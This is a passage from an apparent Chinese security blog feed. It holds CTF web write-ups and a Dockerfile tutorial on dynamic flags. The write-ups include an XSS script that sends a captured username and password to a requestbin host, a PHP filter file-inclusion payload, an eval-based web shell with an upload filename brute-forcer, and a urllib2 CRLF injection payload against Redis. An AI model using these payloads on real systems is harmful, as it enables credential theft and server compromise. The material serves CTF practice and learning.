documcookieent.getElemcookieentsByName(&quot;password&quot;)[0].value;</span><br><span class="line">var res &#x3D; uname + &quot; &quot; + passwd;</span><br><span class="line">documcookieent.locacookietion&#x3D;&quot;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;1drzn1e1&#x2F;?a&#x3D;&quot;+res;</span><br><span class="line">&lt;&#x2F;scricookiept&gt;</span><br></pre></td></tr></table></figure><p>可在requestbin看到回显：</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200326224613793.png" alt></p><p>参考资料：</p><blockquote><p><a href="http://www.ggb0n.cool/2020/03/04/GWCTF2019复现/#题目分析-2" target="_blank" rel="noopener">http://www.ggb0n.cool/2020/03/04/GWCTF2019%E5%A4%8D%E7%8E%B0/#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-2</a></p></blockquote><h3 id="0x-05-BSidesCF-2020-Had-a-bad-day"><a href="#0x-05-BSidesCF-2020-Had-a-bad-day" class="headerlink" title="0x 05 [BSidesCF 2020]Had a bad day"></a>0x 05 [BSidesCF 2020]Had a bad day</h3><ul><li><p>考点</p><p>php伪协议</p></li><li><p>解题过程</p></li></ul><p>首页点击得到一张图片，根据url特性尝试base64读取源代码得到如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $file &#x3D; $_GET[&#39;category&#39;];</span><br><span class="line"></span><br><span class="line">    if(isset($file))</span><br><span class="line">    &#123;</span><br><span class="line">        if( strpos( $file, &quot;woofers&quot; ) !&#x3D;&#x3D;  false || strpos( $file, &quot;meowers&quot; ) !&#x3D;&#x3D;  false || strpos( $file, &quot;index&quot;))&#123;</span><br><span class="line">            include ($file . &#39;.php&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            echo &quot;Sorry, we currently only support woofers and meowers.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>必须含有woofers或meowers或index字符串,尝试首页包含一下看看<code>index.php?category=woofers/../flag</code></p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200328013457364.png" alt></p><p>成功包含，接下来是读取源代码，这里有一个小技巧：php://filter伪协议可以套一层协议，这样提交的参数既包含有woofers这个字符串，也不会影响正常的包含</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;woofers&#x2F;resource&#x3D;flag</span><br></pre></td></tr></table></figure><p>即可得到flag的base64值</p><h3 id="0x-06-N1CTF-2018-easy-harder-php"><a href="#0x-06-N1CTF-2018-easy-harder-php" class="headerlink" title="0x 06 [N1CTF 2018]easy_harder_php"></a>0x 06 [N1CTF 2018]easy_harder_php</h3><ul><li><p>考点</p><p>SSRF+文件名爆破</p></li><li><p>解题过程</p></li></ul><ol><li>SSRF登录参考[De1CTF 2019]ShellShellShell题解，这里记录后续getshell操作。在publish页面存在一个文件上传功能，审计代码发现只能上传图片，而且上传的文件不能有<code>&lt;?php</code>， 这儿可以用<code>&lt;script language=&#39;php&#39;&gt;</code>代替，文件上传之后是执行一个sh命令如下，我们可以文件包含看看sh文件的内容</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(move_uploaded_file($uploaded_file,$move_to_file)) &#123;</span><br><span class="line">            if(stripos(file_get_contents($move_to_file),&#39;&lt;?php&#39;)&gt;&#x3D;0)</span><br><span class="line">                system(&#39;sh &#x2F;home&#x2F;nu1lctf&#x2F;clean_danger.sh&#39;);</span><br><span class="line">            return $file_true_name;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200328124926898.png" alt></p><p>这儿就需要用到linux的一个小trick了，当我们的文件名是以<code>-</code>开头时这个命令会报错从而让文件保存下来。</p><ol start="2"><li>所以我们的思路就是上传一个以<code>-</code>开头的图片码，然后再爆破出上传的文件名，构造shell如下：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt; </span><br><span class="line">$_POST[&quot;xxx&quot;]&#x3D;str_replace(&quot;[&quot;,&quot;&#39;&quot;,$_POST[&quot;xxx&quot;]);</span><br><span class="line">$_POST[&quot;xxx&quot;]&#x3D;str_replace(&quot;]&quot;,&quot;&#39;&quot;,$_POST[&quot;xxx&quot;]);</span><br><span class="line">echo $_POST[&quot;xxx&quot;];</span><br><span class="line">eval($_POST[&quot;xxx&quot;]);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"># 由于题目过了了我们的输入所以，没办法使用引号和单引号，我们用&quot;[&quot;，和&quot;]&quot;代替</span><br></pre></td></tr></table></figure><p>爆破文件名脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">time &#x3D; int(time.time())*100</span><br><span class="line"></span><br><span class="line">request_url &#x3D; &#39;http:&#x2F;&#x2F;8ebb02fd-d153-4801-a104-0da7ec58a462.node3.buuoj.cn&#x2F;index.php?action&#x3D;publish&#39;</span><br><span class="line"></span><br><span class="line">cookie &#x3D; &#39;&#39;&#39;PHPSESSID&#x3D;r8gq3bh41h899tuquthqmoefe3&#39;&#39;&#39;</span><br><span class="line">header &#x3D; &#123;</span><br><span class="line">&#39;Cookie&#39;: cookie&#125;</span><br><span class="line">request_file &#x3D; &#123;&#39;pic&#39;:(&#39;-xx.jpg&#39;,open(&#39;D:&#x2F;-xx.jpg&#39;),&#39;image&#x2F;jpeg&#39;)&#125;</span><br><span class="line">res &#x3D; requests.post(url&#x3D;request_url, headers&#x3D;header,files&#x3D;request_file)# url,data,files</span><br><span class="line">print res.text</span><br><span class="line">print time</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;8ebb02fd-d153-4801-a104-0da7ec58a462.node3.buuoj.cn&#x2F;index.php?action&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;app&#x2F;adminpic&#x2F;-xx&#123;&#125;.jpg&#39;</span><br><span class="line">for i in range(10000):</span><br><span class="line">    tmp &#x3D; time + i</span><br><span class="line">    ul &#x3D; url.format(tmp)</span><br><span class="line">    html &#x3D; requests.get(ul).status_code</span><br><span class="line">    print(html,i)</span><br><span class="line">    if html &#x3D;&#x3D; 200:</span><br><span class="line">        print(ul)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200330011355490.png" alt></p><p>参考链接：</p><blockquote><p><a href="https://blog.csdn.net/a3320315/article/details/104088080" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/104088080</a></p></blockquote><h3 id="0x-07-SWPUCTF-2016-Web7"><a href="#0x-07-SWPUCTF-2016-Web7" class="headerlink" title="0x 07 [SWPUCTF 2016]Web7"></a>0x 07 [SWPUCTF 2016]Web7</h3><ul><li><p>考点</p><p>Python2 Urllib2头部注入(CVE-2016-5699)</p></li><li><p>解题过程</p></li></ul><ol><li>题目源代码：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python </span><br><span class="line"># coding:utf8</span><br><span class="line">import cherrypy</span><br><span class="line">import urllib2</span><br><span class="line">import redis</span><br><span class="line"></span><br><span class="line">class web7:</span><br><span class="line"></span><br><span class="line">    def index(self):</span><br><span class="line">        return &quot;&lt;script&gt; window.location.href&#x3D;&#39;&#x2F;input&#39;;&lt;&#x2F;script&gt;&quot;</span><br><span class="line"></span><br><span class="line">    def input(self,url&#x3D;&quot;&quot;,submit&#x3D;&quot;&quot;):</span><br><span class="line">        file&#x3D;open(&quot;index.html&quot;,&quot;r&quot;).read()</span><br><span class="line">        reheaders&#x3D;&quot;&quot;</span><br><span class="line">        if cherrypy.request.method&#x3D;&#x3D;&quot;GET&quot;:</span><br><span class="line">            reheaders&#x3D;&quot;&quot;</span><br><span class="line">        else:</span><br><span class="line">            url&#x3D;cherrypy.request.params[&quot;url&quot;]</span><br><span class="line">            submit&#x3D;cherrypy.request.params[&quot;submit&quot;]</span><br><span class="line">            try:</span><br><span class="line">                for x in urllib2.urlopen(url).info().headers:</span><br><span class="line">                    reheaders&#x3D;reheaders+x+&quot;&lt;br&gt;&quot;</span><br><span class="line">            except Exception,e:</span><br><span class="line">                reheaders&#x3D;&quot;错误&quot;+str(e)</span><br><span class="line">            for x in urllib2.urlopen(url).info().headers:</span><br><span class="line">                reheaders&#x3D;reheaders+x+&quot;&lt;br&gt;&quot;</span><br><span class="line">        file&#x3D;file.replace(&quot;&lt;?response?&gt;&quot;,reheaders)</span><br><span class="line">        return file</span><br><span class="line"></span><br><span class="line">    def login(self,password&#x3D;&quot;&quot;,submit&#x3D;&quot;&quot;):</span><br><span class="line">        pool &#x3D; redis.ConnectionPool(host&#x3D;&#39;127.0.0.1&#39;, port&#x3D;6379)</span><br><span class="line">        r &#x3D; redis.Redis(connection_pool&#x3D;pool)</span><br><span class="line">        re&#x3D;&quot;&quot;</span><br><span class="line">        file&#x3D;open(&quot;login.html&quot;,&quot;r&quot;).read()</span><br><span class="line">        if cherrypy.request.method&#x3D;&#x3D;&quot;GET&quot;:</span><br><span class="line">            re&#x3D;&quot;&quot;</span><br><span class="line">        else:</span><br><span class="line">            password&#x3D;cherrypy.request.params[&quot;password&quot;]</span><br><span class="line">            submit&#x3D;cherrypy.request.params[&quot;submit&quot;]</span><br><span class="line">            if r.get(&quot;admin&quot;)&#x3D;&#x3D;password:</span><br><span class="line">                re&#x3D;open(&quot;flag&quot;,&#39;r&#39;).readline()</span><br><span class="line">            else:</span><br><span class="line">                re&#x3D;&quot;Can&#39;t find admin:&quot;+password+&quot;,fast fast fast.....&quot;</span><br><span class="line">        file&#x3D;file.replace(&quot;&lt;?response?&gt;&quot;,re)</span><br><span class="line">        return file</span><br><span class="line">cherrypy.config.update(&#123;&#39;server.socket_host&#39;: &#39;0.0.0.0&#39;,</span><br><span class="line">                        &#39;server.socket_port&#39;: 8080,</span><br><span class="line">                       &#125;)</span><br><span class="line">cherrypy.quickstart(web7(),&#39;&#x2F;&#39;)</span><br></pre></td></tr></table></figure><p>题目环境：Python 2.7.5+Redis 2.6</p><p>两个输入点，一个<code>/input</code>允许我们输入URL，然后会用urllib2.urlopen()访问我们的URL。还有一个<code>/login</code>，要求我们输入管理员的密码，如果与Redis数据库中的密码相同，我们就可以拿到Flag。</p><p>根据urllib2.urlopen()的历史漏洞：<a href="https://bugs.python.org/issue30458来打内网" target="_blank" rel="noopener">https://bugs.python.org/issue30458来打内网</a></p><p>简单来说，就是urlopen()处理URL的时候没有考虑换行符，导致我们可以在正常的HTTP头中插入任意内容</p><p>payload：<code>[http://127.0.0.1%0d%0aset%20admin%20admin%0d%0asave%0d%0a:6379/foo](http://127.0.0.1 set admin admin save :6379/foo)</code></p><p>提交之后迅速登入login得到flag</p><blockquote><p>参考资料：<a href="https://tiaonmmn.github.io/2019/09/12/SWPUCTF-2016-Web7/" target="_blank" rel="noopener">https://tiaonmmn.github.io/2019/09/12/SWPUCTF-2016-Web7/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x-01-GYCTF2020-Easyphp&quot;&gt;&lt;a href=&quot;#0x-01-GYCTF2020-Easyphp&quot; class=&quot;headerlink&quot; title=&quot;0x 01 [GYCTF2020]Easyphp&quot;&gt;&lt;/a&gt;0x 01 [GYCTF2020
      
    
    </summary>
    
    
      <category term="ctfwp" scheme="http://yoursite.com/categories/ctfwp/"/>
    
    
      <category term="BUUOJ" scheme="http://yoursite.com/tags/BUUOJ/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入一些tips记录</title>
    <link href="http://yoursite.com/2020/03/23/SQL%E6%B3%A8%E5%85%A5%E4%B8%80%E4%BA%9Btips%E8%AE%B0%E5%BD%95/"/>
    <id>http://yoursite.com/2020/03/23/SQL%E6%B3%A8%E5%85%A5%E4%B8%80%E4%BA%9Btips%E8%AE%B0%E5%BD%95/</id>
    <published>2020-03-23T05:54:12.000Z</published>
    <updated>2020-03-24T12:16:44.481Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="28aaf004cbc44fa34ce39f84200bad2262815ab53452cfebf466febb055ce73b">46b23596492c64531b09cace650cd9a917cc4147342c83ec5831cfb7deff4cc92eca58b13aa289292c1dfb41695096d20d990631909710c5c85bc60c1dd25280455736a76aac636944250effad1a500bd88802eaa4f74681db1de5d15d867b81f24f7a2875e5f2b4c0df228feba81426acb050c49c4a2840e96a7fb58d8f6da7d40250c20b1eaaaed6eaec434c4ebd717c2f7ce71a5a158172d0c8cf878e20dee064f516df21c135e50827534a73e5642445d31524f524d1df54c1aea424a812735b8982d06f4ee7038aa51749c94aed0103673a8b838419ba1ddd35bbbbe7ea9ef42514621eb5f96ec5ad002eff7e4b2608dcc4222e936bb52e6f0f33280162f09875d907ebe233110dfa29ef0af3790528086efd0affa78b8084c3ce112d76e4f4dbac75a0420babcbe6d7978c91ea62107c08d8af6e223372b3ff5fb88c498debab66283c627cdbf6bd0fa950d0eb542074d2775ac30767e8d3a64f4540a21c329f926ba77bc94f6d8f8b0c575d57e1d963f67e2c011a6edd9ee79c2be14c9b834e55549b06e1378b45427c20967ff1572f1d6498d147c53ab735765bc561a4e58d139302675d8e23b8688764e270ab2a4dde24bd46c2e6b7fd96bf268f51220e39bb5ca9564bbfb66e809961e962f406d017298a1b48373300b3dafec9ac011b00036fa270562eb85aa9f6ebc26f</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="tricks" scheme="http://yoursite.com/categories/tricks/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>dockerfile编写学习</title>
    <link href="http://yoursite.com/2020/03/22/dockerfile%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2020/03/22/dockerfile%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-03-22T08:25:07.000Z</published>
    <updated>2020-03-22T14:47:34.344Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x-01-前言"><a href="#0x-01-前言" class="headerlink" title="0x 01 前言"></a>0x 01 前言</h3><p>​        镜像的定制实际上就是定制每一层所添加的配置文件，如果我们可以把每一层的修改、安装、构建、操作的命令都写入一个脚本，然后用这个脚本来构建、定制镜像，那么镜像构建透明性的问题、体积的问题就会得到解决，这个脚本就是 Dockerfile; Dockerfile  是一个文本文件，其内包含了一条条的指令，每一条指令构建一层，每一层指令的内容，就是描述该层应该如何构建，然后通过 commit 构成新的镜像。</p><h3 id="0x-02-Dockerfile-常用参数"><a href="#0x-02-Dockerfile-常用参数" class="headerlink" title="0x 02 Dockerfile 常用参数"></a>0x 02 Dockerfile 常用参数</h3><h4 id="FROM"><a href="#FROM" class="headerlink" title="FROM"></a>FROM</h4><p>FROM：指定基础镜像，必须是第一条指令,格式为<code>FROM image</code>或<code>FROM image:tag</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 定制 nginx 镜像的 Dockerfile</span><br><span class="line"></span><br><span class="line">FROM nginx</span><br><span class="line">RUN echo &#39;&lt;h1&gt;Hello,Docker!&lt;&#x2F;h1&gt;&#39; &gt; &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;index.html</span><br></pre></td></tr></table></figure><p>注： Docker Hub 上有很多高质量的服务类的官方镜像可以拿来直接使用，比如：nginx 、redis 、mysql 、php 、mongo \ tomcat 等，可以在其中找最符合的一个进行定制</p><h3 id="RUN"><a href="#RUN" class="headerlink" title="RUN"></a>RUN</h3><p>RUN ：用来执行命令行命令，格式有两种：</p><ol><li><p>shell 格式： <code>RUN &lt;命令&gt;</code>，就像直接在命令行中输入的命令一样</p></li><li><p>exec 格式：<code>RUN [&quot;可执行文件&quot;，“参数1”，“参数2”]</code>，更像是函数调用中的格式</p></li></ol><p>warning:每一个RUN命令都会在 docker镜像中新建一层，所以应该尽量少用 RUN 命令，而且要在RUN 的最后要做必要的清除工作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 一层构建，并在最后清理压缩包等缓存文件</span><br><span class="line">FROM debian:stretch</span><br><span class="line"></span><br><span class="line">RUN buildDeps&#x3D;&#39;gcc libc6-dev make wget&#39; \</span><br><span class="line">&amp;&amp; apt-get update \</span><br><span class="line">&amp;&amp; apt-get install -y $buildDeps \</span><br><span class="line">&amp;&amp; wget -O redis.tar.gz &quot;http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-5.0.3.tar.gz&quot; \</span><br><span class="line">&amp;&amp; mkdir -p &#x2F;usr&#x2F;src&#x2F;redis \</span><br><span class="line">&amp;&amp; tar -xzf redis.tar.gz -C &#x2F;usr&#x2F;src&#x2F;redis --strip-components&#x3D;1 \</span><br><span class="line">&amp;&amp; make -C &#x2F;usr&#x2F;src&#x2F;redis \</span><br><span class="line">&amp;&amp; make -C &#x2F;usr&#x2F;src&#x2F;redis install \</span><br><span class="line">&amp;&amp; rm -rf &#x2F;var&#x2F;lib&#x2F;apt&#x2F;lists&#x2F;* \</span><br><span class="line">&amp;&amp; rm redis.tar.gz \</span><br><span class="line">&amp;&amp; rm -r &#x2F;usr&#x2F;src&#x2F;redis \</span><br><span class="line">&amp;&amp; apt-get purge -y --auto-remove $buildDeps</span><br></pre></td></tr></table></figure><h4 id="COPY"><a href="#COPY" class="headerlink" title="COPY"></a>COPY</h4><p> COPY : 用来从构建上下文目录中&lt;原路径&gt;的文件/目录复制到新一层镜像内的 &lt;目标路径&gt;位置，格式有两种：</p><p>  1，shell 格式：<code>COPY [--chown=&lt;user&gt;:&lt;group&gt;] &lt;原路径&gt;...&lt;目标路径&gt;</code></p><p>  2，exec 合适：<code>COPY[--chown=&lt;user&gt;:&lt;group&gt;] [&quot;原路径1&quot;，... &quot;&lt;目标路径&gt;&quot;]</code></p><p>原路径：可以是多个，甚至可以是通配符</p><p>目标路径：可以是容器内的绝对路径，也可以是相对于工作目录的相对路径(工作目录可以用 WORKDIR 指令来指定，不需要事先创建，会自动创建)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 利用 通配符 进行复制</span><br><span class="line">COPY hom* &#x2F;mydir&#x2F;</span><br><span class="line">COPY hom?.txt &#x2F;mydir&#x2F;</span><br></pre></td></tr></table></figure><p>note : COPY 会将原文件的各种数据都保留，比如 读、写、执行权限，可以通过 –chown=<user>:<group> 选项来改变文件的所属用户及所属组。</group></user></p><h4 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CMD [&quot;executable&quot;, &quot;param1&quot;, &quot;param2&quot;], 推荐使用该方式</span><br><span class="line"></span><br><span class="line">CMD [&quot;param1&quot;, &quot;param2&quot;]，为ENTRYPOINT指令提供预设参数</span><br><span class="line"></span><br><span class="line">CMD command param1 param2 在SHELL中执行</span><br></pre></td></tr></table></figure><p>CMD指令的主要目的是为执行容器提供默认值，每个Dockerfile只有一个CMD命令，如果指定了多个CMD命令，也只会有一条执行，如果启动容器的时候指定了运行的命令，则会覆盖掉CMD指定的命令。</p><h4 id="EXPOSE"><a href="#EXPOSE" class="headerlink" title="EXPOSE"></a>EXPOSE</h4><p>语法：<code>EXPOSE &lt;端口1&gt; [&lt;端口2&gt;...]</code></p><p>　　该条指令是声明运行时容器提供的服务端口，这只是一个声明，在运行时并不会因为这个声明应用就会开启这个端口的服务。这样声明带来两个好处：</p><p>　　1，帮助镜像使用者理解这个镜像服务的守护端口，以方便配置映射</p><p>　　2，在运行时使用随机端口映射，也就是 docker run -P 时，会自动随机映射 EXPOSE 的端口</p><p>note: 要将 EXPOSE 和在运行时使用 -p  &lt;宿主端口&gt;:&lt;容器端口&gt; 区分开来。-p 是映射宿主端口和容器端口，就是将容器的对应端口服务公开给外界访问，而  EXPOSE 仅仅是声明容器打算使用什么端口而已，并不会在宿主进行端口映射。</p><h4 id="WORKDIR"><a href="#WORKDIR" class="headerlink" title="WORKDIR"></a>WORKDIR</h4><p>格式为：<code>WORKDIR /path/to/workdir</code></p><p>切换⽬录指令，类似于cd命令，对RUN、CMD、ENTRYPOINT⽣效。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WORKDIR &#x2F;var&#x2F;www&#x2F;html</span><br></pre></td></tr></table></figure><h4 id="LABEL"><a href="#LABEL" class="headerlink" title="LABEL"></a>LABEL</h4><p>使用<a href="https://docs.docker.com/engine/reference/builder/#label" target="_blank" rel="noopener">LABEL</a>指令，可以为镜像设置元数据，例如<strong>镜像创建者</strong>或者<strong>镜像说明</strong>。旧版的 Dockerfile 语法使用<a href="https://docs.docker.com/engine/reference/builder/#maintainer-deprecated" target="_blank" rel="noopener">MAINTAINER</a>指令指定镜像创建者，但是它已经被弃用了。有时，一些外部程序需要用到镜像的元数据，例如<a href="https://github.com/NVIDIA/nvidia-docker" target="_blank" rel="noopener">nvidia-docker</a>需要用到<code>com.nvidia.volumes.needed</code>。示例如下:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> node:<span class="number">7</span>-alpine</span><br><span class="line"><span class="keyword">LABEL</span><span class="bash"> maintainer <span class="string">"jakub.skalecki@example.com"</span></span></span><br><span class="line">或者</span><br><span class="line"><span class="keyword">LABEL</span><span class="bash"> Author=<span class="string">"hwlanxiaojun"</span> Blog=<span class="string">"https://hwlanxiaojun.github.io"</span></span></span><br></pre></td></tr></table></figure><h4 id="ENV"><a href="#ENV" class="headerlink" title="ENV"></a>ENV</h4><p>ENV : 用来设置环境变量，格式有两种：</p><p>　　1，ENV <key> <value></value></key></p><p>　　2，ENV <key1>=<value1> <key2>=<value2>…</value2></key2></value1></key1></p><p>在设置了环境变量之后，无论是后面的其它指令，如 RUN ，还是运行时的应用，都可以直接使用这里定义的环境变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 定义环境变量</span><br><span class="line">ENV VERSION&#x3D;1.0 DEBUG&#x3D;ON \</span><br><span class="line">    NAME&#x3D;&quot;Happy Feet&quot;</span><br><span class="line"></span><br><span class="line"># 官方 node 镜像 Dockerfile 中：</span><br><span class="line">ENV NODE_VERSION 7.2.0</span><br></pre></td></tr></table></figure><h3 id="0x-03-构建镜像"><a href="#0x-03-构建镜像" class="headerlink" title="0x 03 构建镜像"></a>0x 03 构建镜像</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker build -t webprac .</span><br><span class="line">&#x2F;&#x2F;其中.表示当前路径，构建的时候要保证jar包和Dockerfile文件在同一个文件夹下，-t: 镜像的名字及标签，webprac是标签名</span><br><span class="line">ocker run -dit -p 8080:80 webprac</span><br></pre></td></tr></table></figure><h4 id="0x-04-动态flag编写"><a href="#0x-04-动态flag编写" class="headerlink" title="0x 04 动态flag编写"></a>0x 04 动态flag编写</h4><p>动态flag的存在形式一般有以下三种：文件中、执行readflag、数据库中</p><h4 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h4><p>linux下，<code>sed</code>命令可以将file中每行的字符串进行替换：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#39;s&#x2F;原字符串&#x2F;新字符串&#x2F;&#39; file</span><br></pre></td></tr></table></figure><p><code>export</code>命令可以查看、设置环境变量</p><p>那么在<code>docker-php-entrypoint</code>文件中写入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line"></span><br><span class="line">sed -i &quot;s&#x2F;flag_here&#x2F;$FLAG&#x2F;&quot; flag.php</span><br><span class="line">export FLAG&#x3D;not_flag</span><br><span class="line">FLAG&#x3D;not_flag</span><br></pre></td></tr></table></figure><p>就会根据当前环境变量的<code>FLAG</code>值来替换掉<code>flag.php</code>中的<code>flag_here</code>，因此还需要在<code>flag.php</code>中设置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; flag_here</span><br></pre></td></tr></table></figure><p>这样，在Dockerfile目录执行<code>docker build -t test .</code>将Dockerfile文件打包为镜像<code>test</code>，使用安装了动态靶机插件的CTFd平台部署后，该插件在启动靶机时会自动生成flag并应用到环境变量中，这样便实现了生成动态flag。</p><h4 id="readflag"><a href="#readflag" class="headerlink" title="readflag"></a>readflag</h4><p>先来看下写法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env bash</span><br><span class="line"></span><br><span class="line">echo $FLAG &gt; &#x2F;flag</span><br><span class="line">chmod u+s 